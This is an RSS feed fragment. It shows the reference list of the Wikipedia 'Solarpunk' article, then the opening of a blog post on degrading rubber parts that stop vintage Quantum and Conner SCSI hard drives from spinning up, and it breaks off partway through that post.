<li id="cite_note-32"><span><b><a href="#cite_ref-32">^</a></b></span> <span><cite><a rel="nofollow" href="https://www.earthisland.org/journal/index.php/magazine/entry/solarpunk-imagines-future-renewable-tech-socio-ecological-enlightenment/">"Solarpunk Imagines a Future Where Renewable Tech Meets Socio-Ecological Enlightenment"</a>. <i>Earth Island Journal</i><span>. Retrieved <span>2024-12-25</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Earth+Island+Journal&amp;rft.atitle=Solarpunk+Imagines+a+Future+Where+Renewable+Tech+Meets+Socio-Ecological+Enlightenment&amp;rft_id=https%3A%2F%2Fwww.earthisland.org%2Fjournal%2Findex.php%2Fmagazine%2Fentry%2Fsolarpunk-imagines-future-renewable-tech-socio-ecological-enlightenment%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-33"><span><b><a href="#cite_ref-33">^</a></b></span> <span><cite id="CITEREFStrong_Hansen2021">Strong Hansen, Kathryn (2021). "Optimistic Fiction as a Tool for Ethical Reflection in STEM". <i>Journal of Academic Ethics</i> (19): <span>425–</span>439.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Journal+of+Academic+Ethics&amp;rft.atitle=Optimistic+Fiction+as+a+Tool+for+Ethical+Reflection+in+STEM&amp;rft.issue=19&amp;rft.pages=%3Cspan+class%3D%22nowrap%22%3E425-%3C%2Fspan%3E439&amp;rft.date=2021&amp;rft.aulast=Strong+Hansen&amp;rft.aufirst=Kathryn&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-34"><span><b><a href="#cite_ref-34">^</a></b></span> <span><cite id="CITEREFHeer2015">Heer, Jeet (2015-11-10). <a rel="nofollow" href="https://newrepublic.com/article/123217/new-utopians">"The New Utopians"</a>. <i><a href="https://en.wikipedia.org/wiki/The_New_Republic" title="The New Republic">The New Republic</a></i>. <a href="https://en.wikipedia.org/wiki/ISSN_(identifier)" title="ISSN (identifier)">ISSN</a>&nbsp;<a rel="nofollow" href="https://search.worldcat.org/issn/0028-6583">0028-6583</a><span>. Retrieved <span>2019-05-08</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+New+Republic&amp;rft.atitle=The+New+Utopians&amp;rft.date=2015-11-10&amp;rft.issn=0028-6583&amp;rft.aulast=Heer&amp;rft.aufirst=Jeet&amp;rft_id=https%3A%2F%2Fnewrepublic.com%2Farticle%2F123217%2Fnew-utopians&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-e-flux-35"><span>^ <a href="#cite_ref-e-flux_35-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-e-flux_35-1"><sup><i><b>b</b></i></sup></a></span> <span><cite id="CITEREFWilk">Wilk, Elivia. <a rel="nofollow" href="https://www.e-flux.com/architecture/positions/191258/is-ornamenting-solar-panels-a-crime/">"Is Ornamenting Solar Panels a Crime?"</a>. <i>e-flux.com</i>. <a rel="nofollow" href="https://web.archive.org/web/20180411161910/http://www.e-flux.com/architecture/positions/191258/is-ornamenting-solar-panels-a-crime/">Archived</a> from the original on 2018-04-11<span>. Retrieved <span>2019-05-08</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=e-flux.com&amp;rft.atitle=Is+Ornamenting+Solar+Panels+a+Crime%3F&amp;rft.aulast=Wilk&amp;rft.aufirst=Elivia&amp;rft_id=https%3A%2F%2Fwww.e-flux.com%2Farchitecture%2Fpositions%2F191258%2Fis-ornamenting-solar-panels-a-crime%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-PCGamer-36"><span>^ <a href="#cite_ref-PCGamer_36-0"><sup><i><b>a</b></i></sup></a> <a href="#cite_ref-PCGamer_36-1"><sup><i><b>b</b></i></sup></a></span> <span><cite id="CITEREFOng2021">Ong, Alexis (April 28, 2021). <a rel="nofollow" href="https://www.pcgamer.com/enough-cyberpunkits-solarpunks-time-to-shine/">"Enough cyberpunk—it's solarpunk's time to shine"</a>. <a href="https://en.wikipedia.org/wiki/PC_Gamer" title="PC Gamer">PC Gamer</a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Enough+cyberpunk%E2%80%94it%27s+solarpunk%27s+time+to+shine&amp;rft.pub=PC+Gamer&amp;rft.date=2021-04-28&amp;rft.aulast=Ong&amp;rft.aufirst=Alexis&amp;rft_id=https%3A%2F%2Fwww.pcgamer.com%2Fenough-cyberpunkits-solarpunks-time-to-shine%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-:0-37"><span><b><a href="#cite_ref-:0_37-0">^</a></b></span> <span><cite id="CITEREFPraise2021">Praise, Zee (2021-01-13). <a rel="nofollow" href="https://imposemagazine.com/bytes/cinema/the-definitive-guide-to-solarpunk-fashion-movies-aesthetic-more">"The definitive guide to solarpunk: fashion, movies , aesthetic &amp; more"</a>. <i>Impose Magazine</i>. <a rel="nofollow" href="https://web.archive.org/web/20210113011324/https://imposemagazine.com/bytes/cinema/the-definitive-guide-to-solarpunk-fashion-movies-aesthetic-more">Archived</a> from the original on 2021-01-13<span>. Retrieved <span>2021-07-04</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Impose+Magazine&amp;rft.atitle=The+definitive+guide+to+solarpunk%3A+fashion%2C+movies+%2C+aesthetic+%26+more&amp;rft.date=2021-01-13&amp;rft.aulast=Praise&amp;rft.aufirst=Zee&amp;rft_id=https%3A%2F%2Fimposemagazine.com%2Fbytes%2Fcinema%2Fthe-definitive-guide-to-solarpunk-fashion-movies-aesthetic-more&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-38"><span><b><a href="#cite_ref-38">^</a></b></span> <span><cite id="CITEREFLevin2024">Levin, Annie (2024-03-25). <a rel="nofollow" href="https://www.currentaffairs.org/news/2024/03/how-solarpunk-fiction-defies-dystopian-doomerism">"How Solarpunk Fiction Defies Dystopian Doomerism"</a>. <i>Current Affairs</i>. <a href="https://en.wikipedia.org/wiki/ISSN_(identifier)" title="ISSN (identifier)">ISSN</a>&nbsp;<a rel="nofollow" href="https://search.worldcat.org/issn/2471-2647">2471-2647</a><span>. Retrieved <span>2024-12-28</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Current+Affairs&amp;rft.atitle=How+Solarpunk+Fiction+Defies+Dystopian+Doomerism&amp;rft.date=2024-03-25&amp;rft.issn=2471-2647&amp;rft.aulast=Levin&amp;rft.aufirst=Annie&amp;rft_id=https%3A%2F%2Fwww.currentaffairs.org%2Fnews%2F2024%2F03%2Fhow-solarpunk-fiction-defies-dystopian-doomerism&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-Wenstrom-39"><span><b><a href="#cite_ref-Wenstrom_39-0">^</a></b></span> <span><cite id="CITEREFWenstrom2021">Wenstrom, Emily (March 2021). <a rel="nofollow" href="https://bookriot.com/solarpunk-genre">"An Introduction to The Solarpunk Genre"</a>. <i>Book Riot</i>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Book+Riot&amp;rft.atitle=An+Introduction+to+The+Solarpunk+Genre&amp;rft.date=2021-03&amp;rft.aulast=Wenstrom&amp;rft.aufirst=Emily&amp;rft_id=https%3A%2F%2Fbookriot.com%2Fsolarpunk-genre&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-40"><span><b><a href="#cite_ref-40">^</a></b></span> <span><cite id="CITEREFCogbill-Seiders2018">Cogbill-Seiders, Elisa (September 2018). <a rel="nofollow" href="https://www.worldliteraturetoday.org/2018/september/solarpunk-ecological-and-fantastical-stories-sustainable-world">"Solarpunk: Ecological and Fantastical Stories in a Sustainable World"</a>. <a href="https://en.wikipedia.org/wiki/World_Literature_Today" title="World Literature Today">World Literature Today</a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Solarpunk%3A+Ecological+and+Fantastical+Stories+in+a+Sustainable+World&amp;rft.pub=World+Literature+Today&amp;rft.date=2018-09&amp;rft.aulast=Cogbill-Seiders&amp;rft.aufirst=Elisa&amp;rft_id=https%3A%2F%2Fwww.worldliteraturetoday.org%2F2018%2Fseptember%2Fsolarpunk-ecological-and-fantastical-stories-sustainable-world&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-41"><span><b><a href="#cite_ref-41">^</a></b></span> <span><cite id="CITEREFCameron2019">Cameron, Rob (October 30, 2019). <a rel="nofollow" href="https://www.tor.com/2019/10/30/in-search-of-afro-solarpunk-part-2-social-justice-is-survival-technology/">"In Search of Afro-Solarpunk, Part 2: Social Justice is Survival Technology"</a>. <a href="https://en.wikipedia.org/wiki/Tor.com" title="Tor.com">Tor.com</a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=In+Search+of+Afro-Solarpunk%2C+Part+2%3A+Social+Justice+is+Survival+Technology&amp;rft.pub=Tor.com&amp;rft.date=2019-10-30&amp;rft.aulast=Cameron&amp;rft.aufirst=Rob&amp;rft_id=https%3A%2F%2Fwww.tor.com%2F2019%2F10%2F30%2Fin-search-of-afro-solarpunk-part-2-social-justice-is-survival-technology%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-42"><span><b><a href="#cite_ref-42">^</a></b></span> <span><cite><a rel="nofollow" href="https://www.tor.com/2020/04/16/introducing-monk-robot-a-new-series-by-becky-chambers/">"Introducing Monk &amp; Robot, a New Series by Becky Chambers"</a>. <a href="https://en.wikipedia.org/wiki/Tor.com" title="Tor.com">Tor.com</a>. April 16, 2020.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Introducing+Monk+%26+Robot%2C+a+New+Series+by+Becky+Chambers&amp;rft.pub=Tor.com&amp;rft.date=2020-04-16&amp;rft_id=https%3A%2F%2Fwww.tor.com%2F2020%2F04%2F16%2Fintroducing-monk-robot-a-new-series-by-becky-chambers%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-43"><span><b><a href="#cite_ref-43">^</a></b></span> <span><cite id="CITEREFKonstantinou2019">Konstantinou, Lee (15 January 2019). <a rel="nofollow" href="https://slate.com/technology/2019/01/hopepunk-cyberpunk-solarpunk-science-fiction-broken.html">"Something Is Broken in Our Science Fiction Why can't we move past cyberpunk?"</a>. <i>slate.com</i>. Slate<span>. Retrieved <span>20 May</span> 2022</span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=slate.com&amp;rft.atitle=Something+Is+Broken+in+Our+Science+Fiction+Why+can%27t+we+move+past+cyberpunk%3F&amp;rft.date=2019-01-15&amp;rft.aulast=Konstantinou&amp;rft.aufirst=Lee&amp;rft_id=https%3A%2F%2Fslate.com%2Ftechnology%2F2019%2F01%2Fhopepunk-cyberpunk-solarpunk-science-fiction-broken.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-Munteanu-44"><span><b><a href="#cite_ref-Munteanu_44-0">^</a></b></span> <span><cite id="CITEREFNorton-KertsonMunteanu2021">Norton-Kertson, Justine (host); <a href="https://en.wikipedia.org/wiki/Nina_Munteanu" title="Nina Munteanu">Munteanu, Nina</a> (22 November 2021). <a rel="nofollow" href="https://shows.acast.com/solarpunk-futures/episodes/interview-with-nina-munteanu">"Interview with Nina Munteanu"</a> <span>(podcast)</span>. <i>Solarpunk Futures</i>. Season 1. Episode 6.  6:45 minutes in. Android Press and Solarpunk Magazine<span>. Retrieved <span>15 August</span> 2024</span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Solarpunk+Futures&amp;rft.series=Season+1.+Episode+6&amp;rft.date=2021-11-22&amp;rft.aulast=Norton-Kertson&amp;rft.aufirst=Justine+%28host%29&amp;rft.au=Munteanu%2C+Nina&amp;rft_id=https%3A%2F%2Fshows.acast.com%2Fsolarpunk-futures%2Fepisodes%2Finterview-with-nina-munteanu&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-45"><span><b><a href="#cite_ref-45">^</a></b></span> <span><cite id="CITEREFHedblomPrévotGrégoire2022">Hedblom, Marcus; Prévot, Anne-Caroline; Grégoire, Axelle (2022-08-01). <a rel="nofollow" href="https://doi.org/10.1016%2Fj.ufug.2022.127661">"Science fiction blockbuster movies – A problem or a path to urban greenery?"</a>. <i>Urban Forestry &amp; Urban Greening</i>. <b>74</b>: 127661. <a href="https://en.wikipedia.org/wiki/Bibcode_(identifier)" title="Bibcode (identifier)">Bibcode</a>:<a rel="nofollow" href="https://ui.adsabs.harvard.edu/abs/2022UFUG...7427661H">2022UFUG...7427661H</a>. <a href="https://en.wikipedia.org/wiki/Doi_(identifier)" title="Doi (identifier)">doi</a>:<span title="Freely accessible"><a rel="nofollow" href="https://doi.org/10.1016%2Fj.ufug.2022.127661">10.1016/j.ufug.2022.127661</a></span>. <a href="https://en.wikipedia.org/wiki/ISSN_(identifier)" title="ISSN (identifier)">ISSN</a>&nbsp;<a rel="nofollow" href="https://search.worldcat.org/issn/1618-8667">1618-8667</a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Urban+Forestry+%26+Urban+Greening&amp;rft.atitle=Science+fiction+blockbuster+movies+%E2%80%93+A+problem+or+a+path+to+urban+greenery%3F&amp;rft.volume=74&amp;rft.pages=127661&amp;rft.date=2022-08-01&amp;rft.issn=1618-8667&amp;rft_id=info%3Adoi%2F10.1016%2Fj.ufug.2022.127661&amp;rft_id=info%3Abibcode%2F2022UFUG...7427661H&amp;rft.aulast=Hedblom&amp;rft.aufirst=Marcus&amp;rft.au=Pr%C3%A9vot%2C+Anne-Caroline&amp;rft.au=Gr%C3%A9goire%2C+Axelle&amp;rft_id=https%3A%2F%2Fdoi.org%2F10.1016%252Fj.ufug.2022.127661&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-46"><span><b><a href="#cite_ref-46">^</a></b></span> <span><cite id="CITEREFResilience2022">Resilience (2022-12-20). <a rel="nofollow" href="https://www.resilience.org/stories/2022-12-20/solarpunk-radical-hope/">"Solarpunk: Radical Hope"</a>. <i>resilience</i><span>. Retrieved <span>2024-12-28</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=resilience&amp;rft.atitle=Solarpunk%3A+Radical+Hope&amp;rft.date=2022-12-20&amp;rft.au=Resilience&amp;rft_id=https%3A%2F%2Fwww.resilience.org%2Fstories%2F2022-12-20%2Fsolarpunk-radical-hope%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-:1-47"><span><b><a href="#cite_ref-:1_47-0">^</a></b></span> <span><cite><a rel="nofollow" href="https://www.vice.com/en/article/wx5aym/solarpunk-is-not-about-pretty-aesthetics-its-about-the-end-of-capitalism">"Solarpunk Is Not About Pretty Aesthetics. It's About the End of Capitalism"</a>. <i>www.vice.com</i>. 2 September 2021<span>. Retrieved <span>2022-10-21</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=www.vice.com&amp;rft.atitle=Solarpunk+Is+Not+About+Pretty+Aesthetics.+It%27s+About+the+End+of+Capitalism&amp;rft.date=2021-09-02&amp;rft_id=https%3A%2F%2Fwww.vice.com%2Fen%2Farticle%2Fwx5aym%2Fsolarpunk-is-not-about-pretty-aesthetics-its-about-the-end-of-capitalism&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-48"><span><b><a href="#cite_ref-48">^</a></b></span> <span><cite><a rel="nofollow" href="https://builtin.com/articles/solarpunk">"What Is Solarpunk? A Guide to the Art Movement"</a>. <i>Built In</i><span>. Retrieved <span>2024-12-28</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Built+In&amp;rft.atitle=What+Is+Solarpunk%3F+A+Guide+to+the+Art+Movement.&amp;rft_id=https%3A%2F%2Fbuiltin.com%2Farticles%2Fsolarpunk&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
<li id="cite_note-49"><span><b><a href="#cite_ref-49">^</a></b></span> <span><cite><a rel="nofollow" href="https://www.straitstimes.com/singapore/singapore-botanic-gardens-clinches-prestigious-unesco-world-heritage-site-status">"Singapore Botanic Gardens clinches prestigious Unesco World Heritage site status"</a>. <i>Straits Times</i><span>. Retrieved <span>2025-01-02</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Straits+Times&amp;rft.atitle=Singapore+Botanic+Gardens+clinches+prestigious+Unesco+World+Heritage+site+status&amp;rft_id=https%3A%2F%2Fwww.straitstimes.com%2Fsingapore%2Fsingapore-botanic-gardens-clinches-prestigious-unesco-world-heritage-site-status&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></span>
</li>
</ol></div>

<ul><li><cite id="CITEREFFörtsch2019">Förtsch, Michael (2019-06-13). <a rel="nofollow" href="https://1e9.community/t/fridays-for-future-treffen-science-fiction-was-ist-eigentlich-solarpunk/1021">"Fridays for Future treffen Science Fiction: Was ist eigentlich Solarpunk?"</a>. <i>1E9</i> (in German). <a rel="nofollow" href="https://web.archive.org/web/20190922111119/https://1e9.community/t/fridays-for-future-treffen-science-fiction-was-ist-eigentlich-solarpunk/1021">Archived</a> from the original on 2019-09-22<span>. Retrieved <span>2021-07-04</span></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=1E9&amp;rft.atitle=Fridays+for+Future+treffen+Science+Fiction%3A+Was+ist+eigentlich+Solarpunk%3F&amp;rft.date=2019-06-13&amp;rft.aulast=F%C3%B6rtsch&amp;rft.aufirst=Michael&amp;rft_id=https%3A%2F%2F1e9.community%2Ft%2Ffridays-for-future-treffen-science-fiction-was-ist-eigentlich-solarpunk%2F1021&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></li>
<li><a href="https://en.wikipedia.org/wiki/Alan_Marshall_(New_Zealand_author)" title="Alan Marshall (New Zealand author)">Marshall, Alan</a> (2019). <a rel="nofollow" href="https://theconversation.com/using-beloved-works-of-literature-to-predict-the-futures-of-cities-109724">"Using beloved works of literature to predict the futures of cities"</a>, The Conversation, March 15, 2019.</li>
<li><cite id="CITEREFWilliams2018">Williams, Rhys (March 10, 2018). <a rel="nofollow" href="https://lareviewofbooks.org/article/solarpunk-against-a-shitty-future/">"Solarpunk: Against a Shitty Future"</a>. <i><a href="https://en.wikipedia.org/wiki/Los_Angeles_Review_of_Books" title="Los Angeles Review of Books">Los Angeles Review of Books</a></i>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Los+Angeles+Review+of+Books&amp;rft.atitle=Solarpunk%3A+Against+a+Shitty+Future&amp;rft.date=2018-03-10&amp;rft.aulast=Williams&amp;rft.aufirst=Rhys&amp;rft_id=https%3A%2F%2Flareviewofbooks.org%2Farticle%2Fsolarpunk-against-a-shitty-future%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></li>
<li><cite id="CITEREFReina-Rozo2021">Reina-Rozo, Juan David (2021). <a rel="nofollow" href="https://doi.org/10.24908%2Fijesjp.v8i1.14292">"Art, Energy and Technology: the Solarpunk Movement"</a>. <i>International Journal of Engineering, Social Justice, and Peace</i>. <b>8</b> (1): <span>47–</span>60. <a href="https://en.wikipedia.org/wiki/Doi_(identifier)" title="Doi (identifier)">doi</a>:<span title="Freely accessible"><a rel="nofollow" href="https://doi.org/10.24908%2Fijesjp.v8i1.14292">10.24908/ijesjp.v8i1.14292</a></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=International+Journal+of+Engineering%2C+Social+Justice%2C+and+Peace&amp;rft.atitle=Art%2C+Energy+and+Technology%3A+the+Solarpunk+Movement&amp;rft.volume=8&amp;rft.issue=1&amp;rft.pages=%3Cspan+class%3D%22nowrap%22%3E47-%3C%2Fspan%3E60&amp;rft.date=2021&amp;rft_id=info%3Adoi%2F10.24908%2Fijesjp.v8i1.14292&amp;rft.aulast=Reina-Rozo&amp;rft.aufirst=Juan+David&amp;rft_id=https%3A%2F%2Fdoi.org%2F10.24908%252Fijesjp.v8i1.14292&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></li>
<li><cite id="CITEREFLynall2022">Lynall, Gregory (2022). "Solarpunk". <a rel="nofollow" href="https://www.cambridge.org/core/books/abs/cambridge-companion-to-literature-and-climate/solarpunk/5C176333194647E6F82EE1C7E5B3EFC6"><i>The Cambridge Companion to Literature and Climate</i></a>. <a href="https://en.wikipedia.org/wiki/Cambridge_University_Press" title="Cambridge University Press">Cambridge University Press</a>. pp.&nbsp;<span>191–</span>200. <a href="https://en.wikipedia.org/wiki/ISBN_(identifier)" title="ISBN (identifier)">ISBN</a>&nbsp;<a href="https://en.wikipedia.org/wiki/Special:BookSources/978-1-316-51216-6" title="Special:BookSources/978-1-316-51216-6"><bdi>978-1-316-51216-6</bdi></a>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=bookitem&amp;rft.atitle=Solarpunk&amp;rft.btitle=The+Cambridge+Companion+to+Literature+and+Climate&amp;rft.pages=%3Cspan+class%3D%22nowrap%22%3E191-%3C%2Fspan%3E200&amp;rft.pub=Cambridge+University+Press&amp;rft.date=2022&amp;rft.isbn=978-1-316-51216-6&amp;rft.aulast=Lynall&amp;rft.aufirst=Gregory&amp;rft_id=https%3A%2F%2Fwww.cambridge.org%2Fcore%2Fbooks%2Fabs%2Fcambridge-companion-to-literature-and-climate%2Fsolarpunk%2F5C176333194647E6F82EE1C7E5B3EFC6&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></li>
<li><cite id="CITEREFCrosby2023">Crosby, Phillip M. (2023). <a rel="nofollow" href="https://doi.org/10.17831%2Fenqarcc.v20i2.1159">"Towards an Anti-Antiutopia"</a>. <i>The ARCC Journal of Architectural Research</i>. <b>20</b> (2): <span>46–</span>75. <a href="https://en.wikipedia.org/wiki/Doi_(identifier)" title="Doi (identifier)">doi</a>:<span title="Freely accessible"><a rel="nofollow" href="https://doi.org/10.17831%2Fenqarcc.v20i2.1159">10.17831/enqarcc.v20i2.1159</a></span>.</cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+ARCC+Journal+of+Architectural+Research&amp;rft.atitle=Towards+an+Anti-Antiutopia&amp;rft.volume=20&amp;rft.issue=2&amp;rft.pages=%3Cspan+class%3D%22nowrap%22%3E46-%3C%2Fspan%3E75&amp;rft.date=2023&amp;rft_id=info%3Adoi%2F10.17831%2Fenqarcc.v20i2.1159&amp;rft.aulast=Crosby&amp;rft.aufirst=Phillip+M.&amp;rft_id=https%3A%2F%2Fdoi.org%2F10.17831%252Fenqarcc.v20i2.1159&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3ASolarpunk"></span></li></ul>


<ul><li><a rel="nofollow" href="https://wvupressonline.com/almanac-for-the-anthropocene">Almanac for the Anthropocene: A Compendium of Solarpunk Futures</a></li>
<li><a rel="nofollow" href="https://medium.com/solarpunks/solarpunk-a-reference-guide-8bcf18871965">Solarpunk: A Reference Guide</a></li>
<li><a rel="nofollow" href="https://solarpunks.net/">Solarpunks.net</a></li>
<li><a rel="nofollow" href="https://www.reddit.com/r/solarpunk/">reddit.com/r/solarpunk</a></li></ul>



<!-- 
NewPP limit report
Parsed by mw‐web.eqiad.next‐548465c4fd‐ljhdb
Cached time: 20250303015715
Cache expiry: 2592000
Reduced expiry: false
Complications: [vary‐revision‐sha1, show‐toc]
CPU time usage: 0.802 seconds
Real time usage: 0.996 seconds
Preprocessor visited node count: 4566/1000000
Post‐expand include size: 207485/2097152 bytes
Template argument size: 5253/2097152 bytes
Highest expansion depth: 12/100
Expensive parser function count: 6/500
Unstrip recursion depth: 1/20
Unstrip post‐expand size: 207366/5000000 bytes
Lua time usage: 0.481/10.000 seconds
Lua memory usage: 5966671/52428800 bytes
Number of Wikibase entities loaded: 1/400
-->
<!--
Transclusion expansion time report (%,ms,calls,template)
100.00%  780.078      1 -total
 43.93%  342.651      1 Template:Reflist
 26.27%  204.945     31 Template:Cite_web
 16.85%  131.417      7 Template:Navbox
 13.30%  103.748      1 Template:Cyberpunk_and_derivatives
 10.89%   84.985     15 Template:Cite_journal
  9.17%   71.507      1 Template:Short_description
  8.75%   68.234      7 Template:Fix
  7.80%   60.822      1 Template:Sister_project_links
  5.53%   43.113      2 Template:Pagetype
-->

<!-- Saved in parser cache with key enwiki:pcache:60694464:|#|:idhash:canonical and timestamp 20250303015715 and revision id 1278535541. Rendering was triggered because: page-view
 -->
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Gooey rubber that's slowly ruining old hard drives (267 pts)]]></title>
            <link>https://www.downtowndougbrown.com/2025/03/the-gooey-rubber-thats-slowly-ruining-old-hard-drives/</link>
            <guid>43235763</guid>
            <pubDate>Sun, 02 Mar 2025 22:11:39 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.downtowndougbrown.com/2025/03/the-gooey-rubber-thats-slowly-ruining-old-hard-drives/">https://www.downtowndougbrown.com/2025/03/the-gooey-rubber-thats-slowly-ruining-old-hard-drives/</a>, See on <a href="https://news.ycombinator.com/item?id=43235763">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
				
<p>As part of my work toward an upcoming post about a lost piece of very obscure Mac history that has finally been found, I’ve been playing around with old Apple-branded SCSI hard drives made by Quantum and Conner in the 1990s. What I’m about to describe is already common knowledge in the vintage computing world, but I thought it would be fun to share my take on it anyway.</p>



<p>What I’m talking about is how a lot of these hard drives just refuse to work anymore. This is very common with old Quantum ProDrive models, like the LPS or the ELS. The drive spins up, you don’t hear the expected pattern of click sounds at startup, and then after a few seconds, it spins back down.</p>



<figure><p>
<iframe title="Quantum ProDrive ELS hard drive doesn't stay spun up" width="500" height="281" src="https://www.youtube.com/embed/imj51lV5DQQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>



<p>This Conner CP30175E drive has a similar problem, but it tries over and over again, playing a tone through the voice coil (I think) in between attempts.</p>



<figure><p>
<iframe title="Conner CP30175E hard drive doesn't stay spun up" width="500" height="281" src="https://www.youtube.com/embed/j7pvs6h2LH8?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>
</p></figure>



